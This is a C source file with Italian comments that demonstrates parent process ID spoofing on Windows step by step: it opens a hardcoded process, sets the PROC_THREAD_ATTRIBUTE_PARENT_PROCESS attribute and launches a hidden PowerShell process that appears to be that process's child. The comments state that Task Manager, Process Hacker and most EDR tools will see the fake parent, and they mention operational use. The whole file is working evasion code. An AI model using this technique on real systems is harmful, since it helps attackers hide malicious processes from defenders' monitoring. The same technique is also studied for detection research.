#include <windows.h>
#include <stdio.h>

/*
    ============================================================
    PPID SPOOFING — PARENT PROCESS ID SPOOFING
    ============================================================
    Tecnica che permette di assegnare a un processo appena creato
    un parent process arbitrario, diverso dal processo che ha
    effettivamente chiamato CreateProcess.

    Il PPID non risiede nel PEB (user-space) ma nella struttura
    EPROCESS, che è kernel-space e non è scrivibile direttamente
    dallo user-mode. L'unico modo legittimo per impostarlo è
    passare l'attributo PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
    a CreateProcess al momento della creazione: è il kernel stesso
    a scrivere il PPID fittizio in EPROCESS.

    Questa è una funzionalità ufficiale dell'API Win32, introdotta
    in Vista per scenari come job object e container. Non richiede
    privilegi elevati: è sufficiente poter aprire il processo
    target con PROCESS_CREATE_PROCESS.
you
    Tool come Process Hacker, Task Manager e la maggior parte
    degli EDR leggono il PPID da EPROCESS — vedranno quindi
    il parent fittizio come genitore legittimo del processo.
*/

int main() {
    printf("=================================================\n");
    printf(" Test PPID Spoofing\n");
    printf(" Parent fittizio: PID hardcoded\n");
    printf("=================================================\n\n");

    /*
        ============================================================
        STEP 1 — APRI UN HANDLE AL PROCESSO PARENT FITTIZIO
        ============================================================
        OpenProcess richiede il privilegio PROCESS_CREATE_PROCESS,
        il minimo necessario per usare un processo come parent in
        UpdateProcThreadAttribute. Non servono privilegi più ampi
        come PROCESS_ALL_ACCESS.

        Il PID è hardcoded: deve corrispondere a un processo
        esistente e accessibile con i privilegi correnti.
        Se il processo non esiste o non è accessibile,
        OpenProcess restituisce NULL e GetLastError indica il motivo
        (es. ERROR_INVALID_PARAMETER se il PID non esiste,
        ERROR_ACCESS_DENIED se i privilegi sono insufficienti).
    */
    DWORD spoofedParentPid = 11728; // PID hardcoded del parent fittizio
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoofedParentPid);
    if (!hParent) {
        printf("OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[OK] Handle al parent fittizio aperto (PID %lu)\n\n", spoofedParentPid);

    /*
        ============================================================
        STEP 2 — ALLOCA E INIZIALIZZA LA LISTA ATTRIBUTI ESTESI
        ============================================================
        PROC_THREAD_ATTRIBUTE_LIST è una struttura opaca il cui
        layout interno non è documentato. L'unico modo per allocarla
        correttamente è seguire il pattern a due chiamate imposto
        dall'API:

        Prima chiamata con buffer NULL: InitializeProcThreadAttributeList
        non inizializza nulla, ma scrive in attrListSize la dimensione
        esatta del buffer necessario per la lista con N attributi
        (in questo caso 1). Non esiste modo di conoscere questa
        dimensione a priori.

        HeapAlloc alloca il buffer della dimensione ottenuta
        nell'heap del processo corrente.

        Seconda chiamata con buffer valido: inizializza effettivamente
        la lista, preparandola a ricevere attributi tramite
        UpdateProcThreadAttribute.
    */
    SIZE_T attrListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);

    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
    if (!attrList) {
        printf("HeapAlloc failed\n");
        CloseHandle(hParent);
        return 1;
    }

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrListSize)) {
        printf("InitializeProcThreadAttributeList failed: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hParent);
        return 1;
    }
    printf("[OK] Lista attributi inizializzata\n");

    /*
        ============================================================
        STEP 3 — INSERISCE L'ATTRIBUTO PARENT_PROCESS NELLA LISTA
        ============================================================
        UpdateProcThreadAttribute inserisce nella lista l'attributo
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, passando un puntatore
        all'handle del parent fittizio.

        Attenzione: UpdateProcThreadAttribute non copia il valore
        di hParent — memorizza il puntatore. L'handle deve quindi
        rimanere valido fino alla chiamata a CreateProcess.
        Chiuderlo prima causerebbe comportamento indefinito.
    */
    if (!UpdateProcThreadAttribute(
            attrList,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent,
            sizeof(HANDLE),
            NULL, NULL))
    {
        printf("UpdateProcThreadAttribute failed: %lu\n", GetLastError());
        DeleteProcThreadAttributeList(attrList);
        HeapFree(GetProcessHeap(), 0, attrList);
        CloseHandle(hParent);
        return 1;
    }
    printf("[OK] Attributo PARENT_PROCESS inserito nella lista\n\n");

    /*
        ============================================================
        STEP 4 — CREA IL PROCESSO CON IL PARENT FITTIZIO
        ============================================================
        STARTUPINFOEXW estende STARTUPINFOW aggiungendo il campo
        lpAttributeList. I campi della struttura base (cb, dwFlags
        ecc.) si trovano annidati sotto StartupInfo.

        Il flag EXTENDED_STARTUPINFO_PRESENT è obbligatorio: senza
        di esso il kernel ignora completamente lpAttributeList e
        il PPID spoofing non avviene. Il cast (LPSTARTUPINFOW)&si
        è necessario perché CreateProcessW si aspetta la struttura
        base, non quella estesa.

        Il processo viene creato normalmente (non sospeso) perché
        non è necessario modificare il PEB — il PPID viene impostato
        dal kernel durante la creazione stessa.
    */
    STARTUPINFOEXW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.StartupInfo.cb  = sizeof(si);
    si.lpAttributeList = attrList;

    wchar_t cmdLine[] = L"powershell.exe -NoProfile -Command sleep 100";

    printf("[*] Creazione processo con parent fittizio...\n");

    BOOL result = CreateProcessW(
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        (LPSTARTUPINFOW)&si,
        &pi
    );

    /*
        ============================================================
        STEP 5 — CLEANUP DELLA LISTA ATTRIBUTI E DELL'HANDLE PARENT
        ============================================================
        Il cleanup va eseguito immediatamente dopo CreateProcess,
        indipendentemente dal suo esito. L'ordine è importante:

        1. DeleteProcThreadAttributeList: rilascia le risorse interne
           della lista (non libera il buffer heap).
        2. HeapFree: libera il buffer allocato al STEP 2.
        3. CloseHandle(hParent): chiude l'handle al parent fittizio.
           Solo ora è sicuro farlo — CreateProcess ha già completato
           la sua lettura dell'attributo.
    */
    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);

    if (!result) {
        printf("CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[OK] Processo creato PID %lu con PPID fittizio %lu\n\n",
           pi.dwProcessId, spoofedParentPid);

    /*
        ============================================================
        STEP 6 — ATTENDI LA TERMINAZIONE E CLEANUP FINALE
        ============================================================
        WaitForSingleObject attende la terminazione del processo
        figlio. In uno scenario operativo questo blocco potrebbe
        essere omesso o sostituito con una gestione asincrona —
        qui è presente solo per completezza della demo.
    */
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("Test completato.\n");
    getchar();
    return 0;
}